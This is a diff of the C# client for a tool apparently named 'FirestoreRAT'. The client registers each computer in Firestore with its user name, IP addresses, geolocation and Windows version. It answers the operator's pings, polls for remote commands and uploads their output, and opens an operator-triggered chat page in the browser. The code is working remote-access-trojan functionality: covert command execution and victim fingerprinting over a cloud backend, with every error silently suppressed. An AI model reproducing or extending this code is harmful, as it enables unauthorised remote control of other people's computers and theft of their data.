@@ -10,6 +10,8 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Timers;
+using Microsoft.Win32;
+using System.Runtime.InteropServices;
 using System.Windows;
 using Timer = System.Timers.Timer;
 
@@ -20,19 +22,21 @@ namespace ClientFirestore
         // ====== Firestore ======
         private FirestoreDb Db => FirestoreProvider.Db;
 
-        private string _pcKey;                 // "PC_PCNAME_USERNAME"
-        private Timer _pingPollTimer;          // опрос ping
+        private string _pcKey;
+        private Timer _pingPollTimer;
         private string _lastPingToken = "";
 
-        private Timer _adminOpenPoll;          // опрос adminOpen
-        private ChatWindow _chat;
+        private Timer _adminOpenPoll;
+        private bool _chatBrowserOpen = false;
 
-        private Timer _cmdPollTimer;           // опрос команд
+        private Timer _cmdPollTimer;
         private string _lastCmdId = "";
 
-        // Таймер для проверки интернета при старте
         private Timer _internetCheckTimer;
         private bool _isInitialized = false;
+
+        // ВАЖНО: URL с .html
+        private const string CHAT_URL = "https://bibonuwu.github.io/FirestoreRAT/chat.html";
 
         private DocumentReference PcDoc =>
             string.IsNullOrEmpty(_pcKey)
@@ -42,34 +46,117 @@ namespace ClientFirestore
         private DocumentReference CmdDoc =>
             PcDoc?.Collection("command").Document("current");
 
-        private const string IPINFO_TOKEN = ""; // если есть токен ipinfo.io
-
-
+        private const string IPINFO_TOKEN = "";
 
         public MainWindow()
         {
             InitializeComponent();
-
             Closing += Window_Closing;
             AppDomain.CurrentDomain.ProcessExit += OnProcessExit;
-
         }
 
+        // ================= ОТКРЫТИЕ ЧАТА В БРАУЗЕРЕ =================
 
+        private void OpenChatInBrowser()
+        {
+            if (_chatBrowserOpen) return;
 
+            try
+            {
+                string userName = Uri.EscapeDataString(Environment.UserName);
+                string pcKey = Uri.EscapeDataString(_pcKey ?? "");
+                string url = $"{CHAT_URL}?pcKey={pcKey}&userName={userName}";
+
+                string browserPath = GetDefaultBrowserPath();
+
+                if (!string.IsNullOrEmpty(browserPath))
+                {
+                    // Запускаем браузер напрямую — без диалога выбора
+                    System.Diagnostics.Process.Start(browserPath, url);
+                }
+                else
+                {
+                    // Фоллбэк: пробуем стандартные браузеры
+                    string[] browsers = new[]
+                    {
+                        @"C:\Program Files\Google\Chrome\Application\chrome.exe",
+                        @"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
+                        @"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
+                        @"C:\Program Files\Microsoft\Edge\Application\msedge.exe",
+                        @"C:\Program Files\Mozilla Firefox\firefox.exe"
+                    };
+
+                    foreach (var b in browsers)
+                    {
+                        if (System.IO.File.Exists(b))
+                        {
+                            System.Diagnostics.Process.Start(b, url);
+                            _chatBrowserOpen = true;
+                            return;
+                        }
+                    }
+
+                    // Последний вариант
+                    System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
+                    {
+                        FileName = url,
+                        UseShellExecute = true
+                    });
+                }
+
+                _chatBrowserOpen = true;
+            }
+            catch (Exception)
+            {
+            }
+        }
+
+        private static string GetDefaultBrowserPath()
+        {
+            try
+            {
+                // Читаем ProgId браузера по умолчанию
+                using (var userChoice = Registry.CurrentUser.OpenSubKey(
+                    @"Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice"))
+                {
+                    if (userChoice == null) return null;
+                    string progId = userChoice.GetValue("ProgId")?.ToString();
+                    if (string.IsNullOrEmpty(progId)) return null;
+
+                    // По ProgId находим путь к exe
+                    using (var cmdKey = Registry.ClassesRoot.OpenSubKey($@"{progId}\shell\open\command"))
+                    {
+                        if (cmdKey == null) return null;
+                        string cmd = cmdKey.GetValue(null)?.ToString();
+                        if (string.IsNullOrEmpty(cmd)) return null;
+
+                        // Извлекаем путь из строки вида: "C:\...\chrome.exe" --args
+                        if (cmd.StartsWith("\""))
+                        {
+                            int end = cmd.IndexOf("\"", 1);
+                            if (end > 1) return cmd.Substring(1, end - 1);
+                        }
+                        else
+                        {
+                            int space = cmd.IndexOf(" ");
+                            return space > 0 ? cmd.Substring(0, space) : cmd;
+                        }
+                    }
+                }
+            }
+            catch { }
+            return null;
+        }
 
         // ================= ПРОВЕРКА ИНТЕРНЕТА =================
 
-        // Проверка наличия активного интернет-соединения
         private async Task<bool> CheckInternetConnectionAsync()
         {
             try
             {
-                // Сначала проверяем сетевое подключение
                 if (!NetworkInterface.GetIsNetworkAvailable())
                     return false;
 
-                // Проверяем доступность Google DNS
                 using (var ping = new Ping())
                 {
                     var reply = await ping.SendPingAsync("8.8.8.8", 2000);
@@ -77,7 +164,6 @@ namespace ClientFirestore
                         return false;
                 }
 
-                // Дополнительная проверка через HTTP запрос
                 using (var httpClient = new HttpClient())
                 {
                     httpClient.Timeout = TimeSpan.FromSeconds(3);
@@ -91,65 +177,38 @@ namespace ClientFirestore
             }
         }
 
-        // Ожидание появления интернета
         private async Task WaitForInternetAsync(CancellationToken cancellationToken = default)
         {
             while (!await CheckInternetConnectionAsync())
             {
                 if (cancellationToken.IsCancellationRequested)
                     throw new TaskCanceledException();
-
-                // Ждем 5 секунд перед следующей проверкой
                 await Task.Delay(5000, cancellationToken);
             }
         }
 
         // ================= ОСНОВНОЙ ПРОЦЕСС ЗАГРУЗКИ =================
 
-
-
-
-
-
-
-
-
-
-
         private async void Window_Loaded(object sender, RoutedEventArgs e)
         {
-            // Запускаем процесс инициализации в фоне
             _ = InitializeApplicationAsync();
         }
-
 
         private async Task InitializeApplicationAsync()
         {
             try
             {
-                // Ждем появления интернета перед началом работы
-                await Dispatcher.InvokeAsync(async () =>
-                {
-                });
-
                 await WaitForInternetAsync();
 
-                await Dispatcher.InvokeAsync(async () =>
-                {
-                });
-
-                // Выполняем инициализацию с повторными попытками при потере соединения
                 await ExecuteWithInternetRetryAsync(async () =>
                 {
                     await RegisterAsync();
                     await SetOnlineAsync(true);
                 });
 
-                // Запускаем таймеры только после успешной инициализации
                 await Dispatcher.InvokeAsync(() =>
                 {
                     _isInitialized = true;
-
                     StartPingPoll();
                     StartCmdPoll();
                     StartAdminOpenWatcher();
@@ -157,58 +216,10 @@ namespace ClientFirestore
             }
             catch (Exception ex)
             {
-                await Dispatcher.InvokeAsync(() =>
-                {
-                });
+                await Dispatcher.InvokeAsync(() => { });
             }
         }
 
-
-        // Обработчик для adminOpen с проверкой интернета
-        private async void AdminOpenPollHandler(object sender, ElapsedEventArgs e)
-        {
-            if (PcDoc == null || !_isInitialized) return;
-
-            // Пропускаем если нет интернета
-            if (!await CheckInternetConnectionAsync())
-                return;
-
-            try
-            {
-                var snap = await PcDoc.GetSnapshotAsync();
-                if (!snap.Exists) return;
-
-                int adminOpen = snap.ContainsField("adminOpen")
-                    ? snap.GetValue<int>("adminOpen")
-                    : 0;
-
-                bool adminWantsOpen = adminOpen == 1;
-
-                Dispatcher.Invoke(() =>
-                {
-                    if (adminWantsOpen)
-                    {
-                        if (_chat == null || !_chat.IsVisible)
-                        {
-                            _chat = new ChatWindow(_pcKey, Environment.UserName, false);
-                            _chat.Show();
-                        }
-                    }
-                    else
-                    {
-                        if (_chat != null && _chat.IsVisible)
-                            _chat.Close();
-                    }
-                });
-            }
-            catch (HttpRequestException)
-            {
-                // Игнорируем сетевые ошибки
-            }
-            catch (Exception)
-            {
-            }
-        }
         // ================= ОБЕРТКА ДЛЯ ОПЕРАЦИЙ С ИНТЕРНЕТОМ =================
 
         private async Task ExecuteWithInternetRetryAsync(Func<Task> action, int maxRetries = 3)
@@ -219,9 +230,7 @@ namespace ClientFirestore
                 try
                 {
                     if (!await CheckInternetConnectionAsync())
-                    {
                         await WaitForInternetAsync();
-                    }
 
                     await action();
                     return;
@@ -229,11 +238,7 @@ namespace ClientFirestore
                 catch (Exception ex) when (IsNetworkException(ex))
                 {
                     retryCount++;
-
-                    if (retryCount >= maxRetries)
-                        throw;
-
-                    // Ждем перед повторной попыткой (экспоненциальная задержка)
+                    if (retryCount >= maxRetries) throw;
                     int delay = 1000 * (int)Math.Pow(2, retryCount);
                     await Task.Delay(delay);
                 }
@@ -246,11 +251,7 @@ namespace ClientFirestore
                    ex is TaskCanceledException ||
                    ex is PingException ||
                    ex is SocketException;
-            
         }
-
-        // ================= МОДИФИЦИРОВАННЫЕ МЕТОДЫ С ПРОВЕРКОЙ ИНТЕРНЕТА =================
-
 
         private async void Repeat_Click(object sender, RoutedEventArgs e)
         {
@@ -264,12 +265,6 @@ namespace ClientFirestore
         // ================= ВСПОМОГАТЕЛЬНЫЕ =================
 
         private static string NowLocal() => DateTime.Now.ToString("dd.MM.yyyy HH:mm:ss");
-
-        private static string EscapeJson(string s)
-        {
-            if (s == null) return "";
-            return s.Replace("\\", "\\\\").Replace("\"", "\\\"");
-        }
 
         private static string GetLocalIp()
         {
@@ -288,8 +283,6 @@ namespace ClientFirestore
             return "";
         }
 
-        // ====== IP info ======
-
         private class IpInfo
         {
             public string ip { get; set; }
@@ -306,10 +299,7 @@ namespace ClientFirestore
             using (var http = new HttpClient())
             {
                 var json = await http.GetStringAsync(url);
-
-                // System.Text.Json
                 return System.Text.Json.JsonSerializer.Deserialize<IpInfo>(json);
-
             }
         }
 
@@ -330,11 +320,8 @@ namespace ClientFirestore
         {
             try
             {
-                // Проверяем интернет перед началом
                 if (!await CheckInternetConnectionAsync())
-                {
                     throw new HttpRequestException("Нет интернет-соединения");
-                }
 
                 string pcName = Environment.MachineName;
                 string userName = Environment.UserName;
@@ -345,17 +332,28 @@ namespace ClientFirestore
                     ? ipinfo.ip
                     : await FallbackPublicIpAsync();
 
+                string osName = GetWindowsFriendlyName();
+                string osBuild = GetWindowsBuild();
+                string osArchitecture = RuntimeInformation.OSArchitecture.ToString();
+                string processArchitecture = RuntimeInformation.ProcessArchitecture.ToString();
+                string framework = RuntimeInformation.FrameworkDescription;
+
                 _pcKey = "PC_" + pcName.Replace(".", "_") + "_" + userName.Replace(".", "_");
 
                 var systemMap = new
                 {
-                    pcName = pcName,
-                    userName = userName,
-                    localIp = localIp,
-                    internetIp = internetIp,
+                    pcName,
+                    userName,
+                    localIp,
+                    internetIp,
                     country = ipinfo.country ?? "",
                     region = ipinfo.region ?? "",
-                    city = ipinfo.city ?? ""
+                    city = ipinfo.city ?? "",
+                    osName,
+                    osBuild,
+                    osArchitecture,
+                    processArchitecture,
+                    framework
                 };
 
                 var onlineMap = new
@@ -370,11 +368,70 @@ namespace ClientFirestore
                     online = onlineMap
                 }, SetOptions.MergeAll);
             }
-            catch (Exception ex)
+            catch (Exception)
             {
-                // Перебрасываем исключение для обработки в ExecuteWithInternetRetryAsync
                 throw;
             }
+        }
+
+        private string GetWindowsFriendlyName()
+        {
+            try
+            {
+                RegistryKey baseKey = RegistryKey.OpenBaseKey(
+                    RegistryHive.LocalMachine,
+                    Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32);
+
+                using (baseKey)
+                using (RegistryKey key = baseKey.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion"))
+                {
+                    if (key == null) return RuntimeInformation.OSDescription;
+
+                    string productName = key.GetValue("ProductName")?.ToString().Trim() ?? "";
+                    string displayVersion = key.GetValue("DisplayVersion")?.ToString().Trim() ?? "";
+                    string releaseId = key.GetValue("ReleaseId")?.ToString().Trim() ?? "";
+
+                    string versionPart = !string.IsNullOrWhiteSpace(displayVersion) ? displayVersion : releaseId;
+
+                    if (!string.IsNullOrWhiteSpace(productName) && !string.IsNullOrWhiteSpace(versionPart))
+                        return productName + " " + versionPart;
+                    if (!string.IsNullOrWhiteSpace(productName))
+                        return productName;
+
+                    return RuntimeInformation.OSDescription;
+                }
+            }
+            catch { return RuntimeInformation.OSDescription; }
+        }
+
+        private string GetWindowsBuild()
+        {
+            try
+            {
+                RegistryKey baseKey = RegistryKey.OpenBaseKey(
+                    RegistryHive.LocalMachine,
+                    Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32);
+
+                using (baseKey)
+                using (RegistryKey key = baseKey.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion"))
+                {
+                    if (key == null) return Environment.OSVersion.Version.ToString();
+
+                    string currentBuild = key.GetValue("CurrentBuild")?.ToString().Trim() ?? "";
+                    if (string.IsNullOrWhiteSpace(currentBuild))
+                        currentBuild = key.GetValue("CurrentBuildNumber")?.ToString().Trim() ?? "";
+
+                    string ubr = key.GetValue("UBR")?.ToString().Trim() ?? "";
+
+                    if (!string.IsNullOrWhiteSpace(currentBuild) && !string.IsNullOrWhiteSpace(ubr))
+                        return currentBuild + "." + ubr;
+                    if (!string.IsNullOrWhiteSpace(currentBuild))
+                        return currentBuild;
+
+                    return Environment.OSVersion.Version.ToString();
+                }
+            }
+            catch { return Environment.OSVersion.Version.ToString(); }
         }
 
         // ================ ONLINE/OFFLINE + PING ===================
@@ -383,34 +440,24 @@ namespace ClientFirestore
         {
             if (PcDoc == null) return;
 
-            // Проверяем интернет перед выполнением
             if (!await CheckInternetConnectionAsync())
-            {
                 throw new HttpRequestException("Нет интернет-соединения");
-            }
 
-            try
+            if (online)
             {
-                if (online)
+                await PcDoc.UpdateAsync(new Dictionary<string, object>
                 {
-                    await PcDoc.UpdateAsync(new Dictionary<string, object>
-                    {
-                        ["online.pcOnline"] = 1,
-                        ["online.startTime"] = NowLocal()
-                    });
-                }
-                else
-                {
-                    await PcDoc.UpdateAsync(new Dictionary<string, object>
-                    {
-                        ["online.pcOnline"] = 0,
-                        ["online.stopTime"] = NowLocal()
-                    });
-                }
+                    ["online.pcOnline"] = 1,
+                    ["online.startTime"] = NowLocal()
+                });
             }
-            catch (Exception ex)
+            else
             {
-                throw;
+                await PcDoc.UpdateAsync(new Dictionary<string, object>
+                {
+                    ["online.pcOnline"] = 0,
+                    ["online.stopTime"] = NowLocal()
+                });
             }
         }
 
@@ -427,10 +474,7 @@ namespace ClientFirestore
         private async Task PollPingAsync()
         {
             if (PcDoc == null || !_isInitialized) return;
-
-            // Пропускаем если нет интернета
-            if (!await CheckInternetConnectionAsync())
-                return;
+            if (!await CheckInternetConnectionAsync()) return;
 
             try
             {
@@ -440,21 +484,14 @@ namespace ClientFirestore
                 var token = snap.GetValue<string>("online.ping") ?? "";
                 if (string.IsNullOrEmpty(token) || token == _lastPingToken) return;
 
-                // отвечаем pong
                 await PcDoc.UpdateAsync("online.pong", token);
                 _lastPingToken = token;
             }
-            catch (HttpRequestException)
-            {
-                // Игнорируем сетевые ошибки в таймере
-            }
-            catch (Exception)
-            {
-                // Другие ошибки логируем, но не прерываем таймер
-            }
+            catch (HttpRequestException) { }
+            catch (Exception) { }
         }
 
-        // =================== WATCH AdminOpen (открыть чат) =================
+        // =================== WATCH AdminOpen =================
 
         private void StartAdminOpenWatcher()
         {
@@ -464,7 +501,8 @@ namespace ClientFirestore
             _adminOpenPoll = new Timer(1000) { AutoReset = true };
             _adminOpenPoll.Elapsed += async (_, __) =>
             {
-                if (PcDoc == null) return;
+                if (PcDoc == null || !_isInitialized) return;
+                if (!await CheckInternetConnectionAsync()) return;
 
                 try
                 {
@@ -475,28 +513,15 @@ namespace ClientFirestore
                         ? snap.GetValue<int>("adminOpen")
                         : 0;
 
-                    bool adminWantsOpen = adminOpen == 1;
-
                     Dispatcher.Invoke(() =>
                     {
-                        if (adminWantsOpen)
-                        {
-                            if (_chat == null || !_chat.IsVisible)
-                            {
-                                _chat = new ChatWindow(_pcKey, Environment.UserName, false);
-                                _chat.Show();
-                            }
-                        }
+                        if (adminOpen == 1)
+                            OpenChatInBrowser();
                         else
-                        {
-                            if (_chat != null && _chat.IsVisible)
-                                _chat.Close();
-                        }
+                            _chatBrowserOpen = false;
                     });
                 }
-                catch
-                {
-                }
+                catch { }
             };
             _adminOpenPoll.Start();
         }
@@ -546,10 +571,7 @@ namespace ClientFirestore
         private async Task PollCommandAsync()
         {
             if (CmdDoc == null || !_isInitialized) return;
-
-            // Пропускаем если нет интернета
-            if (!await CheckInternetConnectionAsync())
-                return;
+            if (!await CheckInternetConnectionAsync()) return;
 
             try
             {
@@ -568,7 +590,6 @@ namespace ClientFirestore
 
                 _lastCmdId = id;
 
-                // помечаем как running
                 await CmdDoc.UpdateAsync(new Dictionary<string, object>
                 {
                     ["status"] = "running",
@@ -589,31 +610,22 @@ namespace ClientFirestore
                     stderr = ex.Message;
                 }
 
-                var outSafe = Trunc(stdout, 60000);
-                var errSafe = Trunc(stderr, 60000);
-
-                // Отправляем результат (с проверкой интернета)
                 if (await CheckInternetConnectionAsync())
                 {
                     await CmdDoc.UpdateAsync(new Dictionary<string, object>
                     {
                         ["status"] = "done",
                         ["exitCode"] = exitCode,
-                        ["stdout"] = outSafe,
-                        ["stderr"] = errSafe,
+                        ["stdout"] = Trunc(stdout, 60000),
+                        ["stderr"] = Trunc(stderr, 60000),
                         ["cmd"] = cmdText,
                         ["id"] = id,
                         ["worker"] = _pcKey
                     });
                 }
             }
-            catch (HttpRequestException)
-            {
-                // Игнорируем сетевые ошибки
-            }
-            catch (Exception)
-            {
-            }
+            catch (HttpRequestException) { }
+            catch (Exception) { }
         }
 
         // =================== ЗАКРЫТИЕ =======================
@@ -624,29 +636,18 @@ namespace ClientFirestore
             {
                 _pingPollTimer?.Stop();
                 _pingPollTimer?.Dispose();
-
                 _cmdPollTimer?.Stop();
                 _cmdPollTimer?.Dispose();
-
                 _adminOpenPoll?.Stop();
                 _adminOpenPoll?.Dispose();
-
                 await SetOnlineAsync(false);
             }
-            catch
-            {
-            }
+            catch { }
         }
 
         private async void OnProcessExit(object sender, EventArgs e)
         {
-            try
-            {
-                await SetOnlineAsync(false);
-            }
-            catch
-            {
-            }
+            try { await SetOnlineAsync(false); } catch { }
         }
     }
 }
